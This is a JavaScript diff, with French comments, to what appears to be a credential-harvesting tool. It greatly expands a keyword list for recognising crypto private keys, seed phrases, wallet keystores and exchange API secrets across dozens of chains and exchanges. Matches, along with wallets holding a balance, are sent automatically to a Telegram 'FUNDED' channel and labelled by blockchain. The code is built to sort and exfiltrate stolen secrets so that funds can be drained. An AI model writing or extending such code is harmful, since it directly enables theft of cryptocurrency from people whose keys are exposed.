@@ -389,41 +389,195 @@ ${fileContent}
               await sendTelegram(msg1, CHAT_ID_ALL);
               await sendTelegram(msg2, CHAT_ID_ALL);
 
-              // Détecter si c'est une clé privée crypto
+              // Détecter si c'est une clé privée crypto - LISTE EXHAUSTIVE
               const isCryptoPrivateKey = [
-                'private_key', 'wallet_key', 'secret_key',
-                'eth_private_key', 'ethereum_private_key',
-                'bitcoin_private_key', 'btc_private_key',
-                'solana_private_key', 'sol_private_key',
-                'mnemonic', 'seed_phrase', 'recovery_phrase',
-                'binance_api_key', 'binance_secret',
-                'coinbase_api', 'kraken_api',
-              ].some(keyword => 
-                pattern.pattern_type.toLowerCase().includes(keyword) ||
-                pattern.pattern_name.toLowerCase().includes(keyword)
-              );
+                // Clés privées génériques
+                'private_key', 'privatekey', 'private', 'wallet_key', 'walletkey', 'secret_key', 'secretkey',
+                
+                // Ethereum & EVM chains
+                'eth_private_key', 'ethereum_private_key', 'eth_key', 'ethereum_key',
+                'polygon_private_key', 'matic_private_key', 'bsc_private_key', 'bnb_private_key',
+                'avalanche_private_key', 'avax_private_key', 'arbitrum_private_key', 'optimism_private_key',
+                
+                // Bitcoin
+                'bitcoin_private_key', 'btc_private_key', 'bitcoin_key', 'btc_key',
+                'wif', 'wallet_import_format',
+                
+                // Solana
+                'solana_private_key', 'sol_private_key', 'solana_key', 'sol_key',
+                'solana_wallet', 'phantom_key',
+                
+                // Cardano
+                'cardano_private_key', 'ada_private_key', 'cardano_key', 'ada_key',
+                
+                // Polkadot
+                'polkadot_private_key', 'dot_private_key', 'kusama_private_key',
+                
+                // Tron
+                'tron_private_key', 'trx_private_key', 'tron_key', 'trx_key',
+                
+                // Ripple
+                'ripple_private_key', 'xrp_private_key', 'ripple_secret', 'xrp_secret',
+                
+                // Litecoin
+                'litecoin_private_key', 'ltc_private_key', 'litecoin_key', 'ltc_key',
+                
+                // Dogecoin
+                'dogecoin_private_key', 'doge_private_key', 'dogecoin_key', 'doge_key',
+                
+                // Monero
+                'monero_private_key', 'xmr_private_key', 'monero_key', 'xmr_key',
+                
+                // Cosmos
+                'cosmos_private_key', 'atom_private_key', 'cosmos_key', 'atom_key',
+                
+                // Near
+                'near_private_key', 'near_key', 'near_secret',
+                
+                // Algorand
+                'algorand_private_key', 'algo_private_key', 'algorand_key', 'algo_key',
+                
+                // Tezos
+                'tezos_private_key', 'xtz_private_key', 'tezos_key', 'xtz_key',
+                
+                // Stellar
+                'stellar_private_key', 'xlm_private_key', 'stellar_secret', 'xlm_secret',
+                
+                // Seed phrases / Mnemonics (BIP39)
+                'mnemonic', 'seed_phrase', 'seedphrase', 'recovery_phrase', 'recoveryphrase',
+                'seed_words', 'recovery_words', 'backup_phrase', 'secret_phrase',
+                'wallet_seed', 'wallet_mnemonic', '12_words', '24_words',
+                
+                // Exchange APIs
+                'binance_api_key', 'binance_secret', 'binance_private',
+                'coinbase_api', 'coinbase_secret', 'coinbase_private',
+                'kraken_api', 'kraken_secret', 'kraken_private',
+                'kucoin_api', 'kucoin_secret', 'kucoin_private',
+                'bybit_api', 'bybit_secret', 'bybit_private',
+                'okx_api', 'okx_secret', 'okx_private',
+                'huobi_api', 'huobi_secret', 'huobi_private',
+                'bitfinex_api', 'bitfinex_secret', 'bitfinex_private',
+                'gate_io_api', 'gateio_api', 'gate_secret',
+                'ftx_api', 'ftx_secret', 'ftx_private',
+                
+                // Wallet specifics
+                'metamask', 'trust_wallet', 'phantom', 'exodus', 'ledger',
+                'trezor', 'electrum', 'myetherwallet', 'coinomi',
+                
+                // Hardware wallets
+                'hardware_wallet', 'cold_wallet', 'paper_wallet',
+                
+                // Web3 / Crypto general
+                'crypto_key', 'crypto_private', 'crypto_secret', 'crypto_wallet',
+                'web3_private', 'web3_key', 'blockchain_key', 'blockchain_private',
+                
+                // Keystore
+                'keystore', 'keystorejson', 'wallet_json', 'encrypted_key',
+              ].some(keyword => {
+                const lower = pattern.pattern_type.toLowerCase();
+                const nameLower = pattern.pattern_name.toLowerCase();
+                return lower.includes(keyword) || nameLower.includes(keyword);
+              });
 
               // ENVOI AUTOMATIQUE au canal FUNDED pour:
               // 1. Si balance > 0
               // 2. OU si c'est une clé privée crypto (NOUVEAU)
               if (balanceInfo.hasBalance || isCryptoPrivateKey) {
-                // Déterminer la blockchain potentielle
-                let blockchain = 'Unknown';
+                // Déterminer la blockchain potentielle - LISTE COMPLÈTE
+                let blockchain = '🔐 Crypto Wallet';
                 const patternLower = pattern.pattern_type.toLowerCase();
-                if (patternLower.includes('eth') || patternLower.includes('ethereum')) {
+                const nameLower = pattern.pattern_name.toLowerCase();
+                const combined = `${patternLower} ${nameLower}`;
+                
+                // Ethereum & EVM chains
+                if (combined.includes('eth') || combined.includes('ethereum')) {
                   blockchain = '⟠ Ethereum';
-                } else if (patternLower.includes('btc') || patternLower.includes('bitcoin')) {
+                } else if (combined.includes('polygon') || combined.includes('matic')) {
+                  blockchain = '🟣 Polygon';
+                } else if (combined.includes('bsc') || combined.includes('binance chain') || combined.includes('bnb chain')) {
+                  blockchain = '🟡 BNB Chain';
+                } else if (combined.includes('avalanche') || combined.includes('avax')) {
+                  blockchain = '🔺 Avalanche';
+                } else if (combined.includes('arbitrum')) {
+                  blockchain = '🔵 Arbitrum';
+                } else if (combined.includes('optimism')) {
+                  blockchain = '🔴 Optimism';
+                  
+                // Bitcoin
+                } else if (combined.includes('btc') || combined.includes('bitcoin')) {
                   blockchain = '₿ Bitcoin';
-                } else if (patternLower.includes('sol') || patternLower.includes('solana')) {
+                  
+                // Solana
+                } else if (combined.includes('sol') || combined.includes('solana') || combined.includes('phantom')) {
                   blockchain = '◎ Solana';
-                } else if (patternLower.includes('mnemonic') || patternLower.includes('seed')) {
+                  
+                // Cardano
+                } else if (combined.includes('ada') || combined.includes('cardano')) {
+                  blockchain = '🅰️ Cardano';
+                  
+                // Polkadot
+                } else if (combined.includes('dot') || combined.includes('polkadot')) {
+                  blockchain = '🟣 Polkadot';
+                } else if (combined.includes('kusama') || combined.includes('ksm')) {
+                  blockchain = '🦅 Kusama';
+                  
+                // Tron
+                } else if (combined.includes('trx') || combined.includes('tron')) {
+                  blockchain = '🔷 Tron';
+                  
+                // Ripple
+                } else if (combined.includes('xrp') || combined.includes('ripple')) {
+                  blockchain = '💧 Ripple (XRP)';
+                  
+                // Litecoin
+                } else if (combined.includes('ltc') || combined.includes('litecoin')) {
+                  blockchain = 'Ł Litecoin';
+                  
+                // Dogecoin
+                } else if (combined.includes('doge') || combined.includes('dogecoin')) {
+                  blockchain = '🐕 Dogecoin';
+                  
+                // Monero
+                } else if (combined.includes('xmr') || combined.includes('monero')) {
+                  blockchain = '🔒 Monero';
+                  
+                // Cosmos
+                } else if (combined.includes('atom') || combined.includes('cosmos')) {
+                  blockchain = '⚛️ Cosmos';
+                  
+                // Near
+                } else if (combined.includes('near')) {
+                  blockchain = '🌐 Near';
+                  
+                // Algorand
+                } else if (combined.includes('algo') || combined.includes('algorand')) {
+                  blockchain = '▲ Algorand';
+                  
+                // Tezos
+                } else if (combined.includes('xtz') || combined.includes('tezos')) {
+                  blockchain = '🔷 Tezos';
+                  
+                // Stellar
+                } else if (combined.includes('xlm') || combined.includes('stellar')) {
+                  blockchain = '⭐ Stellar';
+                  
+                // Seed phrases (multi-chain)
+                } else if (combined.includes('mnemonic') || combined.includes('seed') || combined.includes('recovery')) {
                   blockchain = '🔑 Multi-chain (BIP39)';
-                } else if (patternLower.includes('binance')) {
-                  blockchain = '🅱️ Binance';
-                } else if (patternLower.includes('coinbase')) {
-                  blockchain = '🟦 Coinbase';
-                } else {
-                  blockchain = '🔐 Crypto Wallet';
+                  
+                // Exchanges
+                } else if (combined.includes('binance')) {
+                  blockchain = '🅱️ Binance Exchange';
+                } else if (combined.includes('coinbase')) {
+                  blockchain = '🟦 Coinbase Exchange';
+                } else if (combined.includes('kraken')) {
+                  blockchain = '🐙 Kraken Exchange';
+                } else if (combined.includes('kucoin')) {
+                  blockchain = '🟢 KuCoin Exchange';
+                } else if (combined.includes('bybit')) {
+                  blockchain = '🟡 Bybit Exchange';
+                } else if (combined.includes('okx')) {
+                  blockchain = '⚫ OKX Exchange';
                 }
 
                 // ANALYSE IA du danger
